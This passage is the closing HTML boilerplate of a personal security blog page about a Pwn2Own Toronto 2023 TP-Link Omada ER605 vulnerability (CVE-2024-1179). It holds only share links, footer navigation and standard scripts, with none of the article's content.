  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;is_video=false&amp;description=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605&amp;body=Check out this article: http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;title=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;name=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/&amp;t=Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>